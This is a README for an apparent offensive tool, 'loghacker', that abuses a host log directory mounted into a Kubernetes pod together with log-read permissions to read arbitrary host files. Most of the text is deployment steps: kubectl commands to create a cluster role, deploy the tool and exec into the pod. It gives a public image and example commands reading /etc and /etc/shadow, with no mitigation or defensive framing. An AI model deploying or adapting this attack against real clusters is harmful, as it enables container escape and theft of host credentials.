# mount-var-log-hacker

If /var/mount is mounted into a container, and the serviceaccount in the container has permission to read logs, the application in the container can read any file on the host.

binary name: loghacker

public build image : https://hub.docker.com/r/shadowstar884/loghacker

deploy steps:
```bash
# step 1: create ns and cluster role
kubectl apply -f hack/cluster-role.yaml

# step 2: deploy loghacker
kubectl apply -f hack/deploy-loghacker.yaml

# step 3: attach log-hacker
kubectl exec -it -n mount-log log-hacker -- bash

# step 4: 
./loghacker

# happy loghackerrrrrr

# ./loghacker ls /etc
# ./loghacker cat /etc/shadow

```

pow:

![cat-pow](https://github.com/awslshadowstar/mount-var-log-hacker/assets/52888924/55e6599a-1e8d-4824-953b-2464665d5ef5)
